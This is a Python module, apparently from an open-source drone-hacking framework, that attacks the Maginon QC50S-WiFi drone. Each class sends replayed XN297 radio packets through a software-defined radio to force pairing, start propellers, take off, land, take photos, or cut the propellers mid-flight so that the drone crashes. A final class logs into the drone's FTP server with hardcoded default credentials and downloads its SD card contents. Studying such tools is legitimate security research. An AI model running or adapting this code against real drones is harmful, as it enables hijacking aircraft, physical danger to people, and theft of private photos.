# -*- coding: UTF-8 -*-
__copyright__ = "E. Borel"
__license__ = "agpl-3.0"
__doc__ = """
Module for Maginon QC50S-WiFi
"""


from sploitkit import *
from lib.radio.SDRModule import SDRModule, SDRXN297Module, validate_int
from lib.wifi.mixin import WifiConnectMixin
from lib.wifi import drone_filter
from lib.drones import DroneModule
import time

from gnuradio import blocks
from gnuradio import digital
from gnuradio import gr
import osmosdr

class MaginonModule(SDRXN297Module):
	"""
	Proxy class defining high-level attributes and methods for each command
	"""
	def __init__(self):
		"""
		Sets default config values
		"""
		super(MaginonModule, self).__init__()
		self.config[SDRModule.FREQUENCY] = "2.4449e9"
		self.config[SDRModule.SAMP_SYMS] = 32
		self.config[SDRXN297Module.TXID] = "f5 b8 83 40"
		self.config[SDRXN297Module.SEED] = 45680
	def set_propellers_ready(self):
		"""
		Sets the propellers ready to spin
		"""
		container = gr.top_block()
		silent = blocks.vector_source_c((self.silent,), True, 1, [])
		gmsk_mod = digital.gmsk_mod(samples_per_symbol=self.samp_syms, bt=1, verbose=False, log=False,)
		payload, size = self.build_payload([132, 189, 228, 103, 9, 170, 136, 136, 18, 109])
		vec_src = blocks.vector_source_b(payload, True, 1, [])
		mux = blocks.stream_mux(gr.sizeof_gr_complex*1, (size, size * 11))
		container.connect((mux, 0), (self.osmosdr_sink, 0))
		container.connect((vec_src, 0), (gmsk_mod, 0))
		container.connect((silent, 0), (mux, 1))
		container.connect((gmsk_mod, 0), (mux, 0))
		container.start()
		time.sleep(3)
		container.stop()
		container.wait()

class Pairing(MaginonModule):
	"""
	Module abusing the weak pairing process of the drone.
	The sent message depends on the TX id, given as global argument
	"""
	path = "command/maginon/qc50s"

	def __init__(self):
		super(Pairing, self).__init__()

	def run(self):
		"""
		Establish a connection between drone and HackRF. Useless if already paired with the genuine controller
		"""
		self.init()
		if self.osmosdr_sink == None:
			return
		gmsk_mod = digital.gmsk_mod(samples_per_symbol=self.samp_syms, bt=1, verbose=False, log=False,)
		silent = blocks.vector_source_c((self.silent,), True, 1, [])
		container = gr.top_block()
		self.TXid = []
		payload, size = self.build_payload([142, 220, 38, 255, 150, 44, 141, 34, 13, 174, 140, 136, 18, 198])
		vec_src = blocks.vector_source_b(payload, True, 1, [])
		mux = blocks.stream_mux(gr.sizeof_gr_complex*1, (size,  size * 4))
		container.connect((mux, 0), (self.osmosdr_sink, 0))
		container.connect((vec_src, 0), (gmsk_mod, 0))
		container.connect((silent, 0), (mux, 1))
		container.connect((gmsk_mod, 0), (mux, 0))
		container.start()
		time.sleep(3)
		container.stop()
		container.wait()
		self.osmosdr_sink.disconnect_all()

class StartPropellers(MaginonModule):
	"""
	Module starting the propellers. The drone works this way: propellers are started with a specific button and then the joystick is used to take-off
	At this pace, the drone cannot fly. Then not really harmful
	"""
	path = "command/maginon/qc50s"

	def __init__(self):
		super(StartPropellers, self).__init__()

	def run(self):
		"""
		Starts the propellers at their lowest speed (doesn't take off)
		"""
		self.init()
		if self.osmosdr_sink == None:
			return
		self.set_propellers_ready()
		container = gr.top_block()
		gmsk_mod = digital.gmsk_mod(samples_per_symbol=self.samp_syms, bt=1, verbose=False, log=False,)
		payload = self.build_payload([132, 189, 228, 103, 9, 168, 136, 138, 18, 109])[0]
		vec_src = blocks.vector_source_b(payload, True, 1, [])
		container.connect((vec_src, 0), (gmsk_mod, 0))
		container.connect((gmsk_mod, 0), (self.osmosdr_sink, 0))
		container.start()
		self.wait_for_exit()
		container.stop()
		container.wait()
		self.osmosdr_sink.disconnect_all()

class Land(MaginonModule):
	"""
	Module making the drone landing (more or less) smoothly. Still, it should not crash it, but can still be dangerous
	"""
	path = "command/maginon/qc50s"

	def __init__(self):
		super(Land, self).__init__()

	def run(self):
		"""
		Makes the drone landing
		"""
		self.init()
		if self.osmosdr_sink == None:
			return
		container = gr.top_block()
		gmsk_mod = digital.gmsk_mod(samples_per_symbol=self.samp_syms, bt=1, verbose=False, log=False,)
		payload = self.build_payload([132, 189, 228, 103, 9, 170, 136, 136, 18, 109])[0]
		vec_src = blocks.vector_source_b(payload, True, 1, [])
		container.connect((vec_src, 0), (gmsk_mod, 0))
		container.connect((gmsk_mod, 0), (self.osmosdr_sink, 0))
		container.start()
		self.wait_for_exit()
		container.stop()
		container.wait()
		self.osmosdr_sink.disconnect_all()


class EmergencyStop(MaginonModule):
	"""
	Module stopping the propellers, crashing the drone
	"""
	path = "command/maginon/qc50s"

	def __init__(self):
		super(EmergencyStop, self).__init__()

	def run(self):
		"""
		Turns off the propellers
		"""
		self.init()
		if self.osmosdr_sink == None:
			return
		container = gr.top_block()
		gmsk_mod = digital.gmsk_mod(samples_per_symbol=self.samp_syms, bt=1, verbose=False, log=False,)
		payload = self.build_payload([132, 189, 228, 103, 9, 168, 136, 139, 18, 108])[0]
		vec_src = blocks.vector_source_b(payload, True, 1, [])
		container.connect((vec_src, 0), (gmsk_mod, 0))
		container.connect((gmsk_mod, 0), (self.osmosdr_sink, 0))
		container.start()
		self.wait_for_exit()
		container.stop()
		container.wait()
		self.osmosdr_sink.disconnect_all()

class TakePhoto(MaginonModule):
	"""
	Module taking a picture, if the drone embeds a camera
	"""
	path = "command/maginon/qc50s"

	def __init__(self):
		super(TakePhoto, self).__init__()

	def run(self):
		"""
		Takes a photo
		"""
		self.init()
		if self.osmosdr_sink == None:
			return
		container = gr.top_block()
		gmsk_mod = digital.gmsk_mod(samples_per_symbol=self.samp_syms, bt=1, verbose=False, log=False,)
		gmsk_mod1 = digital.gmsk_mod(samples_per_symbol=self.samp_syms,bt=1,verbose=False,log=False,)
		silent = blocks.vector_source_c((self.silent,), True, 1, [])
		payload, size1 = self.build_payload([132, 189, 228, 103, 11, 170, 136, 136, 18, 111])
		vec_src0 = blocks.vector_source_b(payload, True, 1, [])
		payload, size2 = self.build_payload([132, 189, 228, 103,  9, 170, 136, 136, 18, 109])
		vec_src1 = blocks.vector_source_b(payload, True, 1, [])
		mux = blocks.stream_mux(gr.sizeof_gr_complex*1, (size1, size1 * 11, size2))
		container.connect((mux, 0), (self.osmosdr_sink, 0))
		container.connect((vec_src1, 0), (gmsk_mod1, 0))
		container.connect((vec_src0, 0), (gmsk_mod, 0))
		container.connect((silent, 0), (mux, 1))
		container.connect((gmsk_mod1, 0), (mux, 0))
		container.connect((gmsk_mod, 0), (mux, 2))
		container.start()
		time.sleep(0.5)
		container.stop()
		container.wait()
		self.osmosdr_sink.disconnect_all()


class Takeoff(MaginonModule):
	"""
	Module making the drone taking-off
	"""
	path = "command/maginon/qc50s"

	def __init__(self):
		super(Takeoff, self).__init__()

	def run(self):
		"""
		Makes the drone leaving the ground
		"""
		self.init()
		if self.osmosdr_sink == None:
			return
		self.set_propellers_ready()
		speed = 0xf1
		container = gr.top_block()
		gmsk_mod = digital.gmsk_mod(samples_per_symbol=self.samp_syms, bt=1, verbose=False, log=False,)
		gmsk_mod1 = digital.gmsk_mod(samples_per_symbol=self.samp_syms,bt=1,verbose=False,log=False,)
		silent0 = blocks.vector_source_c((self.silent,), True, 1, [])
		silent1 = blocks.vector_source_c((self.silent,), True, 1, [])
		payload, size1 = self.build_payload([132, 189, 228, speed, 9, 168, 136, 138, 18, speed - 6])
		vec_Src0 = blocks.vector_source_b(payload, True, 1, [])
		payload, size2 = self.build_payload([132, 189, 228, 103, 9, 168, 136, 138, 18, 109])
		vec_Src1 = blocks.vector_source_b(payload, True, 1, [])
		mux = blocks.stream_mux(gr.sizeof_gr_complex*1, (size1, size1 * 11, size2, size2 * 11))
		container.connect((mux, 0), (self.osmosdr_sink, 0))
		container.connect((vec_Src1, 0), (gmsk_mod1, 0))
		container.connect((vec_Src0, 0), (gmsk_mod, 0))
		container.connect((silent0, 0), (mux, 1))
		container.connect((silent1, 0), (mux, 3))
		container.connect((gmsk_mod1, 0), (mux, 0))
		container.connect((gmsk_mod, 0), (mux, 2))
		container.start()
		self.wait_for_exit()
		container.stop()
		container.wait()
		self.osmosdr_sink.disconnect_all()


class GetPictures(DroneModule, WifiConnectMixin):
	"""
	Module abusing weak Wi-Fi configuration to grab the content on the SD card, if any. The drone serves as an open access point and runs an FTP server with
	known credentials
	"""
	path = "command/maginon/qc50s"
	requirements = {'python': ["ftplib"]}
	drone = "Maginon QC-50S Wifi"

	def check_AP(o):
		x =[e for e in o.state['TARGETS'].keys() if drone_filter(e, None) and e in o.console.root.connected_targets]
		return x

	config = Config({
		Option(
		    'IP',
		    "IP address of drone's AP",
		    True,
		): "192.168.1.1",
		Option(
		    "TARGET",
		    "Target's SSID",
		    True,
		    choices=check_AP
		): None
	})

	def run(self):
		"""
		Connects to the FTP server and steals the content
		"""
		from ftplib import FTP
		try:
		    ftp = FTP("192.168.1.1", "FTPX", "12345678", timeout=3)
		except:
		    self.logger.failure("Cannot connect to FTP server")
		    return
		ftp.set_pasv(True)
		ftp.cwd("DCIMA")
		files = ftp.nlst()
		for file in files:
			with open(file, "wb") as f:
		            ftp.retrbinary("RETR %s" % file, f.write)
		ftp.quit()

